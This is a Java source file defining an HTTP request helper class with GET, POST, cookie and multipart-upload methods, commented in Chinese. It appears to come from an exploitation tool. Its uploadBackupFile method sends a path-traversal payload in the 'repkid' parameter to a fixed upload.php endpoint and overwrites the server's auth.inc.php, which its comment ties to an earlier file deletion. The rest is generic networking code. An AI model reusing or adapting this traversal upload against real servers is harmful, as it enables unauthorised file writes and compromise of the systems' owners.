package com.xinyu.tools;

import java.io.*;
import java.net.*;

public class Request {
    private static final String CODING = "GBK";
    private static Response response;

    static {
        System.out.println("静态代码块");
        response = new Response();
    }


    public static Response get(String url) {
        return get(url, null);
    }

    public static Response get(String url, String cookie) {
        try {
            HttpURLConnection conn = http(url);
            conn.setRequestMethod("GET");
            //设置Cookie
            if (cookie != null) {
                conn.setRequestProperty("Cookie", cookie);
            }
            response = getResponse(conn, url, cookie);
        } catch (SocketTimeoutException e) {
            System.out.println("连接超时");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return response;
    }

    public static Response post(String url, String params) {
        return post(url, params, null);
    }

    public static Response post(String url, String params, String cookie) {
        try {
            HttpURLConnection conn = http(url);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-type", "application/x-www-form-urlencoded");
            //设置Cookie
            if (cookie != null) {
                conn.setRequestProperty("Cookie", cookie);
            }
            OutputStream outputStream = conn.getOutputStream();
            outputStream.write(params.getBytes());
            outputStream.flush();
            outputStream.close();
            response = getResponse(conn, url, cookie);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return response;
    }

    public static Response upload(String url, StringBuilder tempParams) {
        return upload(url, tempParams, null);
    }


    public static Response upload(String url, StringBuilder tempParams, String cookie) {
        try {
            HttpURLConnection conn = http(url);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Accept-Charset", CODING);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + "********");
            //设置Cookie
            if (cookie != null) {
                conn.setRequestProperty("Cookie", cookie);
            }
            DataOutputStream requestStream = new DataOutputStream(conn.getOutputStream());
            requestStream.writeBytes("--" + "********" + "\r\n");
            tempParams.append("\r\n");
            requestStream.writeBytes(tempParams.toString());
            requestStream.flush();
            response = getResponse(conn, url, cookie);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return response;
    }


    /**
     * 文件删除专用,重新上传auth.inc.php文件
     * @param url
     * @return
     */
    public static Response uploadBackupFile(String url) {
        try {
            HttpURLConnection conn = http(url + "/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./");
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Accept-Charset", CODING);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + "********");
            DataOutputStream requestStream = new DataOutputStream(conn.getOutputStream());
            requestStream.writeBytes("--" + "********" + "\r\n");
            StringBuilder tempParams = new StringBuilder();
            tempParams.append("Content-Disposition: form-data; name=\"FILE1\"; filename=\"auth.inc.php\"");
            tempParams.append("\r\n");
            tempParams.append("\r\n");
            requestStream.writeBytes(tempParams.toString());

            //第一种方式,从文件读取,发送文件数据
//            FileInputStream fileInput = new FileInputStream("auth.inc.php");
            int bytesRead;
            byte[] buffer = new byte[1024];
            DataInputStream in = new DataInputStream(new FileInputStream("/auth.inc.php"));
            while ((bytesRead = in.read(buffer)) != -1) {
                requestStream.write(buffer, 0, bytesRead);
            }
            requestStream.writeBytes("\r\n");
            requestStream.writeBytes("--" + "********" + "\r\n");
            requestStream.flush();
            response = getResponse(conn, url, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return response;
    }


    /**
     * 请求的基本设置在这里完成
     *
     * @param url
     * @return
     */
    private static HttpURLConnection http(String url) throws IOException {
        URL url_object = new URL(url); //创建URL对象
        HttpURLConnection conn = (HttpURLConnection) url_object.openConnection(); //打开一个HttpURLConnection连接
        conn.setConnectTimeout(3 * 1000); //设置连接主机超时时间
        conn.setReadTimeout(3 * 1000); //设置从主机读取数据超时时间
        conn.setDoOutput(true); //设置该连接允许读取
        conn.setDoInput(true); //设置该连接允许写入
        conn.setUseCaches(false); //关闭缓存,默认为true
        conn.setInstanceFollowRedirects(false); //关闭自动重定向(自动容易出现问题,这里手动处理)
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.7 Safari/537.36");
        return conn;
    }

    /**
     * 连接,处理状态码
     *
     * @param conn
     * @param cookie
     * @return
     * @throws IOException
     */
    private static Response getResponse(HttpURLConnection conn, String url, String cookie) {
        try {
            conn.connect();
//            System.out.println(conn.getResponseCode());
            response.setText(null);
            //如果500异常,强行读数据流会报错,这里避免掉
//            System.out.println(conn.getResponseCode());
            if (conn.getResponseCode() != 500 && conn.getResponseCode() != 404 && conn.getResponseCode() != 403) {
                response.setText(streamToString(conn.getInputStream()));
            }else{
                //防止404时响应包出现空指针异常
                response.setText("");
            }
            response.setCode(conn.getResponseCode()); //状态码
            response.setHead(conn.getHeaderFields().toString()); //响应头信息_getHeaderField("Set-Cookie")
        } catch (IOException e) {
            System.out.println("未知异常:Request类182行");
            e.printStackTrace();
            response = new Response(0, null, null);
        }
        return response;
    }


    /**
     * 处理数据流
     *
     * @param inputStream
     * @return
     */
    private static String streamToString(InputStream inputStream) {
        String resultString = null;

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int len = 0;
        byte data[] = new byte[1024];
        try {
            while ((len = inputStream.read(data)) != -1) {
                byteArrayOutputStream.write(data, 0, len);
            }
            byte[] allData = byteArrayOutputStream.toByteArray();
            resultString = new String(allData, CODING);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return resultString;
    }


}
